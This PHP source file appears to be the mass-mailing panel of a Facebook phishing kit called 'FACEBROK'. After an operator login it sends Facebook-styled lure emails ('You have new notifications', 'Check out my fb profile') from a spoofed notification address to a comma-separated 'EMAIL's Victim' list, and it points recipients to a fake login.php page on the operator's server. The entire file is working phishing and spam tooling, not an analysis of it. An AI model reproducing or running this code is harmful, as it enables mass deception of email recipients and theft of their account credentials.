<?php

	include 'core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	if(!$facebrok->check_session()){
		if($_GET['action']=="login"){
			$facebrok->checkuser($_POST['userp'],$_POST['passp']);
		}
		?>
		<style type="text/css"> @import url(https://fonts.googleapis.com/css?family=Roboto:400,300,600,400italic); * {margin: 0; padding: 0; box-sizing: border-box; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -webkit-font-smoothing: antialiased; -moz-font-smoothing: antialiased; -o-font-smoothing: antialiased; font-smoothing: antialiased; text-rendering: optimizeLegibility; } body {font-family: "Roboto", Helvetica, Arial, sans-serif; font-weight: 100; font-size: 12px; line-height: 30px; color: #777; background: #196386; } .container {max-width: 400px; width: 100%; margin: 0 auto; position: relative; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea, #contact button[type="submit"] {font: 400 12px/16px "Roboto", Helvetica, Arial, sans-serif; } #contact {background: #F9F9F9; padding: 25px; margin: 150px 0; box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24); } #contact h3 {display: block; font-size: 30px; font-weight: 300; margin-bottom: 10px; } #contact h4 {margin: 5px 0 15px; display: block; font-size: 13px; font-weight: 400; } fieldset {border: medium none !important; margin: 0 0 10px; min-width: 100%; padding: 0; width: 100%; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea {width: 100%; border: 1px solid #ccc; background: #FFF; margin: 0 0 5px; padding: 10px; } #contact input[type="text"]:hover, #contact input[type="email"]:hover, #contact input[type="tel"]:hover, #contact input[type="url"]:hover, #contact textarea:hover {-webkit-transition: border-color 0.3s ease-in-out; -moz-transition: border-color 0.3s ease-in-out; transition: border-color 0.3s ease-in-out; border: 1px solid #aaa; } #contact textarea {height: 100px; max-width: 100%; resize: none; } #contact button[type="submit"] {cursor: pointer; width: 100%; border: none; background: #4CAF50; color: #FFF; margin: 0 0 5px; padding: 10px; font-size: 15px; } #contact button[type="submit"]:hover {background: #43A047; -webkit-transition: background 0.3s ease-in-out; -moz-transition: background 0.3s ease-in-out; transition: background-color 0.3s ease-in-out; } #contact button[type="submit"]:active {box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5); } .copyright {text-align: center; } #contact input:focus, #contact textarea:focus {outline: 0; border: 1px solid #aaa; } ::-webkit-input-placeholder {color: #888; } :-moz-placeholder {color: #888; } ::-moz-placeholder {color: #888; } :-ms-input-placeholder {color: #888; } </style> <div class="container">
		<link rel="shortcut icon" href="../asses/facebook.ico" />
		<title>FACEBROK Log in</title> 
		  <form id="contact" action="index.php?action=login" method="post">
		    <h3>FACEBROK</h3>
		    <h4>Log in</h4>
		    <fieldset>
		      <input placeholder="username facebrok" type="text" name="userp" tabindex="5" required>
		    </fieldset>
		    <fieldset>
		      <input placeholder="password facebrok" type="text" name="passp" tabindex="6" required></textarea>
		    </fieldset>
		    <fieldset>
		      <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">Login</button>
		    </fieldset>
		  </form>
		</div>
		<?php
	}else{

		if($_GET['action']=="logout"){$facebrok->logout();}
		if($_GET['action']=="go"){
			$var=$_POST['url'];
			if($_POST['group1']=="0"){$title='Check out my fb profile';include("templates/checkoutmyfacebookprofile.php");}
			if($_POST['group1']=="1"){$title='You have new notifications';include("templates/youhavenewnotifications.php");}
			if($_POST['group1']=="2"){$title='Confirmed your friend request fb';include("templates/confirmedyourfriendrequestfacebook.php");}
			$html = urlencode($html);
	        $html = ereg_replace("%5C%22", "%22", $html);
	        $html = urldecode($html);
	        $html = stripslashes($html);
	        $title = stripslashes($title);
			$email_dividual=preg_split("/[,]+/",$_POST['email']);
			foreach ($email_dividual as &$seperate_email) {
				$headers =   'From: notification@mailface.com' . "\r\n" .
				             'Reply-To: '.$seperate_email.'' . "\r\n" .
				             'MIME-Version: 1.0' . "\r\n" .
							 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
			if(@mail($seperate_email,$title, $html, $headers)){echo'<div class="msg msg-ok"> <p><strong>{'.$seperate_email.'} Email sent succesifully!</strong></p> <a href="#" class="close">close</a> </div>';sleep($_POST['time']);}else{$error=error_get_last();echo '<div class="msg msg-error"> <p><strong>Error, check your SMTP service, '.$error["message"].'</strong></p> <a href="#" class="close">close</a> </div>';break;} 
			} }else{
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><link rel="shortcut icon" href="asses/facebook.ico" />
<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
	<title>FACEBROK Panel - templates</title>
	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
</head>
<body>
<!-- Header -->
<div id="header">
	<div class="shell">
		<!-- Logo + Top Nav -->
		<div id="top">
			<h1><img src="asses/facebrok_icon.png"></h1>

		</div>
		<!-- End Logo + Top Nav -->
		<!-- Main Nav -->
		<div id="navigation">
			<ul>
			    <li><a href="index.php" class="active"><span>Dashboard</span></a></li>
			    <li><a href="templates.php"><span>Templates</span></a></li>
			    <li><a href="spammer.php"><span>Spam</span></a></li>
			    <li><a href="config.php"><span>Config</span></a></li>
			    <li><a href="about.php"><span>About</span></a></li>
			    <li><a href="index.php?action=logout"><span>Log out</span></a></li>
			</ul>
		</div>
		<!-- End Main Nav -->
	</div>
</div>
<!-- End Header -->

<!-- Container -->
<div id="container">
	<div class="shell">
		
		<!-- Small Nav -->
		<div class="small-nav">
			<a href="#">spam</a>
			<span>&gt;</span>
			SPAM Email
		</div>
		<!-- End Small Nav -->
		<script src="asses/jquery-1.2.6.min.js" language="javascript"></script>
	<script language="javascript">// <![CDATA[
		$(document).ready(function() {
		    $().ajaxStart(function() {
		        $('#loading').show();
		        $('#result').hide();
		    }).ajaxStop(function() {
		        $('#loading').hide();
		        $('#result').fadeIn('slow');
		    });
		    $('#form, #start_boombing, #fo3').submit(function() {
		        $.ajax({
		            type: 'POST',
		            url: $(this).attr('action'),
		            data: $(this).serialize(),
		            success: function(data) {
		                $('#result').html(data);
		            }
		        })        
		        return false;
		    });
		})
	// ]]></script>

		
<div id="result"></div>
		<br />




		<!-- Main -->
		<div id="main">
			<div class="cl">&nbsp;</div>
			<form action="spammer.php?action=go" method="post" id="start_boombing" name="start_boombing">
			<!-- Content -->
			<div id="content">
				
				<!-- Box -->
				<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2 class="left">SPAM Email</h2>
						
					</div>
					<!-- End Box Head -->	

					
					<!-- Table -->
					<div class="table">
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
							<tr>
								<th>Choice</th>
								<th>Template</th>
								<th>Preview</th>
							</tr>
							<tr>
								<td><input type="radio" name="group1" value="0" class="radio" /></td>
								<td>Check out my Facebook profile.</td>
								<td><a href="templates/checkoutmyfacebookprofile.php?view=true" target="_blank">[PREVIEW]</a></td>
							</tr>
							<tr>
								<td><input type="radio" name="group1" value="1" class="radio" /></td>
								<td>You have new notifications.</td>
								<td><a href="templates/youhavenewnotifications.php?view=true" target="_blank">[PREVIEW]</a></td>
							</tr>							<tr>
								<td><input type="radio" name="group1" value="2" class="radio" /></td>
								<td>Confirmed your friend request fb.</td>
								<td><a href="templates/confirmedyourfriendrequestfacebook.php?view=true" target="_blank">[PREVIEW]</a></td>
							</tr>					
						</table>
					</div>

				</div>
			</div>
			<div class="cl">&nbsp;</div>			
		</div>
		<!-- Main -->
		<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2>EMAIL's Victim</h2>
					</div>
					<!-- End Box Head -->
					
						
						<!-- Form -->
						<div class="form">
							<p>
									<label>REDIRECTING TO URL<span>(Required Field)</span></label>
									<input class="field size1" name="url" value="http://<?php echo $_SERVER['SERVER_NAME'];?>/login.php?login_attempt=1&lwv=1" type="text">
								</p>	
								<p>
									<span class="req">sperate email by comma</span>
									<label>Email-s <span>(Required Field)</span></label>
									<input class="field size1" name="email" value="email@hotmail.com" type="text">
								</p>	
								<p>
									<span class="req">(1000=1s)</span>
									<label>Sleep <span>(Required Field)</span></label>
									<input class="field size1" name="time" value="3000" type="number">
								</p>
								
						<!-- Form Buttons -->
						<div class="buttons">
							<input class="button" value="submit" type="submit">
						</div>
						<!-- End Form Buttons -->
					</form>
				</div>
	
	</div>
</div>
<!-- End Container -->



</body>
</html>
<?php }} ?>